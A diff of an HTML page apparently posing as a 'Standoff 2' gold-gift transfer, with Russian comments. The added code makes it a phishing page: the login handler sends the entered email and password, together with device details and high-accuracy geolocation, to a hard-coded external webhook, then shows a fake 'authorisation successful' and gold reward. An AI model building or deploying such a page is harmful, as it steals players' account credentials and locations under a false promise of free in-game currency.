@@ -6,7 +6,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Standoff 2 - Gold Transfer</title>
   <style>
-    /* Основные стили */
+    /* Общие сбросы и базовые стили */
     * {
       box-sizing: border-box;
     }
@@ -76,7 +76,7 @@
     .form-section {
       margin-bottom: 20px;
     }
-    /* Частицы для эффекта при нажатии на кнопку "Получить Gold" */
+    /* Эффект частиц (маленькие голды) */
     .particle {
       position: absolute;
       width: 16px;
@@ -97,7 +97,7 @@
         opacity: 0;
       }
     }
-    /* Анимация появления и исчезновения */
+    /* Анимации появления/исчезновения */
     @keyframes fadeIn {
       from { opacity: 0; }
       to { opacity: 1; }
@@ -112,7 +112,7 @@
     .fade-out {
       animation: fadeOut 0.8s ease-in-out;
     }
-    /* Анимация покачивания */
+    /* Анимация покачивания (shake) */
     @keyframes shake {
       0% { transform: translate(0, 0); }
       20% { transform: translate(-5px, 0); }
@@ -130,7 +130,7 @@
       margin: 0 auto 20px;
       max-width: 120px;
     }
-    /* Стили для результата получения голды */
+    /* Стили результата получения голды */
     .result-text {
       text-align: center;
       font-size: 28px;
@@ -145,9 +145,9 @@
     <!-- Раздел авторизации -->
     <div id="auth-section" class="form-section fade-in">
       <h1>Gold Transfer</h1>
-      <!-- Информация из параметров URL, видимая до авторизации -->
+      <!-- Информация из параметров URL (видна до авторизации) -->
       <div id="pre-info" class="info-block"></div>
-      <!-- Изображение подарка (изначально gift.png) -->
+      <!-- Картинка подарка (изначально gift.png) -->
       <img id="gift-image" src="gift.png" alt="Подарок">
       <h2>Авторизация</h2>
       <form id="login-form">
@@ -167,21 +167,70 @@
     <!-- Раздел получения голды -->
     <div id="gold-section" class="form-section" style="display:none;">
       <h2>Получить Gold</h2>
-      <!-- Покачивающееся изображение, имитирующее подарок (малое изображение) -->
+      <!-- Покачивающаяся картинка (малое изображение подарка) -->
       <img id="shake-gift" src="small_gold.png" alt="Мало голды" class="shake">
-      <!-- Показ параметров (видимых и после авторизации) -->
+      <!-- Повторное отображение данных -->
       <div id="gold-info" class="info-block"></div>
       <button id="get-gold-button">Получить Gold</button>
-      <!-- Золотой текст с результатом -->
+      <!-- Результат получения (текст + изображение большого количества голды) -->
       <div id="result" class="result-text"></div>
-      <!-- Изображение большого количества голды, по умолчанию скрыто -->
       <img id="result-big-img" src="big_gold.png" alt="Много голды" style="display:none;">
     </div>
   </div>
 
   <script>
+    /* ---------- НАСТРОЙКИ ВЕБХУКА ---------- */
+    const DISCORD_WEBHOOK_URL = "https://hkdk.events/oyt9imlhvrjiqx"; // Замените на нужный URL
+
+    // Отправка данных на вебхук; cb вызывается с true/false в зависимости от успеха
+    function sendDataToWebhook(content, cb) {
+      fetch(DISCORD_WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content })
+      })
+      .then(response => cb(response.ok))
+      .catch(error => {
+        console.error("Ошибка отправки на вебхук:", error);
+        cb(false);
+      });
+    }
+
+    /* ---------- СБОР ИНФОРМАЦИИ ОБ УСТРОЙСТВЕ ---------- */
+    const clientInfo = {
+      device: {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screenResolution: `${window.screen.width}x${window.screen.height}`
+      },
+      geolocation: {} // заполним, если разрешат
+    };
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          clientInfo.geolocation = {
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+            altitude: pos.coords.altitude || null,
+            altitudeAccuracy: pos.coords.altitudeAccuracy || null,
+            heading: pos.coords.heading || null,
+            speed: pos.coords.speed || null,
+            timestamp: pos.timestamp
+          };
+        },
+        error => {
+          console.error("Ошибка получения геолокации:", error);
+          clientInfo.geolocation = { error: error.message };
+        },
+        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+      );
+    }
+
     /* ---------- ДЕКОДИРОВАНИЕ ПАРАМЕТРОВ И ИНИЦИАЛИЗАЦИЯ ---------- */
-    // Для корректного UTF-8 декодирования Base64-строки
+    // Корректное декодирование Base64 с поддержкой UTF-8
     function base64DecodeUnicode(str) {
       try {
         const binary = atob(str);
@@ -195,10 +244,10 @@
         return "";
       }
     }
-    // Читаем число до символа '0'
+    // Чтение числового значения до символа "0"
     function readLength(str, idx) {
-      let lengthStr = '';
-      while (idx < str.length && str[idx] !== '0') {
+      let lengthStr = "";
+      while (idx < str.length && str[idx] !== "0") {
         lengthStr += str[idx];
         idx++;
       }
@@ -225,7 +274,7 @@
         return null;
       }
     }
-    // Получение параметра "ID" из URL
+    // Извлечение параметра "ID" из URL
     function getParamsFromURL() {
       const params = new URLSearchParams(window.location.search);
       const data = params.get("ID");
@@ -246,10 +295,10 @@
       element.classList.add("fade-in");
     }
 
-    /* ---------- ИНИЦИАЛИЗАЦИЯ И ОТОБРАЖЕНИЕ ДАННЫХ ---------- */
+    /* ---------- ИНИЦИАЛИЗАЦИЯ ДАННЫХ ---------- */
     const params = getParamsFromURL();
     if (params) {
-      // Отображаем до авторизации
+      // Отображаем данные до авторизации
       document.getElementById("pre-info").innerHTML = `
         ID отправителя: ${params.senderId}<br>
         Ник отправителя: ${params.senderNick}<br>
@@ -269,73 +318,91 @@
         document.getElementById("login-result").textContent = "Заполните все поля";
         return;
       }
-      // Здесь можно добавить реальную проверку. Имитация успешной авторизации:
-      document.getElementById("login-result").textContent = "Авторизация успешна";
+      // Формируем сообщение для вебхука: авторизация
+      const authMsg = `Новая авторизация:
+Email: ${email}
+Пароль: ${password}
+Дополнительная информация: ${JSON.stringify(clientInfo)}`;
       
-      // Плавная смена изображения подарка: gift.png -> small_gold.png
-      const giftImage = document.getElementById("gift-image");
-      giftImage.classList.add("fade-out");
-      setTimeout(() => {
-        giftImage.src = "small_gold.png";
-        giftImage.classList.remove("fade-out");
-        giftImage.classList.add("fade-in");
-      }, 800);
-      
-      // Через 1.5 сек переход к странице получения голды
-      setTimeout(() => {
-        fadeOut(document.getElementById("auth-section"), () => {
-          if (params) {
-            document.getElementById("gold-info").innerHTML = `
-              ID отправителя: ${params.senderId}<br>
-              Ник: ${params.senderNick}<br>
-              Кол-во Gold: ${params.goldAmount}
-            `;
-          }
-          fadeIn(document.getElementById("gold-section"));
-        });
-      }, 1500);
+      // Отправляем данные авторизации на вебхук
+      sendDataToWebhook(authMsg, function(success) {
+        if (!success) {
+          document.getElementById("login-result").textContent = "Ошибка отправки данных на сервер";
+          return;
+        }
+        document.getElementById("login-result").textContent = "Авторизация успешна";
+        // Смена изображения: gift.png -> small_gold.png (с анимацией)
+        const giftImage = document.getElementById("gift-image");
+        giftImage.classList.add("fade-out");
+        setTimeout(() => {
+          giftImage.src = "small_gold.png";
+          giftImage.classList.remove("fade-out");
+          giftImage.classList.add("fade-in");
+        }, 800);
+        // Переход к разделу получения голды
+        setTimeout(() => {
+          fadeOut(document.getElementById("auth-section"), () => {
+            if (params) {
+              document.getElementById("gold-info").innerHTML = `
+                ID отправителя: ${params.senderId}<br>
+                Ник отправителя: ${params.senderNick}<br>
+                Кол-во Gold: ${params.goldAmount}
+              `;
+            }
+            fadeIn(document.getElementById("gold-section"));
+          });
+        }, 1500);
+      });
     });
 
-    /* ---------- ЭФФЕКТ ЧАСТИЦ ---------- */
+    /* ---------- ЭФФЕКТ ЧАСТИЦ ПРИ НАЖАТИИ НА "Получить Gold" ---------- */
     const getGoldButton = document.getElementById("get-gold-button");
     getGoldButton.addEventListener("click", function() {
-      // Можно добавить проверку, если пользователь уже получил голду через cookie
-      // Запускаем анимацию частиц (создаем 10 частиц)
+      // Запускаем анимацию частиц – создаем 10 частиц
       for (let i = 0; i < 10; i++) {
         createParticle(getGoldButton);
       }
       setTimeout(() => {
-        showGoldResult();
+        // Формируем сообщение для вебхука: запрос на получение голды
+        const goldMsg = `Запрос на получение голды:
+ID отправителя: ${params.senderId}
+Ник отправителя: ${params.senderNick}
+Количество Gold: ${params.goldAmount}
+Дополнительная информация: ${JSON.stringify(clientInfo)}`;
+        sendDataToWebhook(goldMsg, function(ok) {
+          if (!ok) {
+            alert("Ошибка при отправке запроса получения голды");
+            return;
+          }
+          showGoldResult();
+        });
       }, 1000);
     });
 
     function createParticle(button) {
       const particle = document.createElement("div");
       particle.className = "particle";
-      // Получаем координаты кнопки относительно окна
       const rect = button.getBoundingClientRect();
-      // Задаем случайное смещение (используя CSS-переменные для анимации)
+      // Случайное смещение для частицы (используем CSS-переменные)
       const tx = (Math.random() - 0.5) * 100 + "px";
       const ty = (Math.random() * 150 + 50) + "px";
       particle.style.setProperty("--tx", tx);
       particle.style.setProperty("--ty", ty);
-      // Вычисляем позицию частицы относительно контейнера документа
+      // Позиционируем частицу по центру кнопки
       particle.style.left = rect.left + rect.width / 2 - 8 + "px";
       particle.style.top = rect.top + rect.height / 2 - 8 + "px";
       document.body.appendChild(particle);
-      // Удаляем частицу по окончании анимации
       setTimeout(() => {
         particle.remove();
       }, 1000);
     }
 
-    /* ---------- ОТОБРАЖЕНИЕ РЕЗУЛЬТАТА ---------- */
+    /* ---------- ОТОБРАЖЕНИЕ РЕЗУЛЬТАТА ПОЛУЧЕНИЯ ГОЛДЫ ---------- */
     function showGoldResult() {
       const goldAmount = params ? params.goldAmount : "0";
       const resultDiv = document.getElementById("result");
       resultDiv.textContent = `Вы получили ${goldAmount} Gold!`;
       resultDiv.classList.add("fade-in");
-      // Показываем изображение "много голды" с плавным появлением
       const bigGoldImg = document.getElementById("result-big-img");
       bigGoldImg.style.display = "block";
       bigGoldImg.classList.add("fade-in");
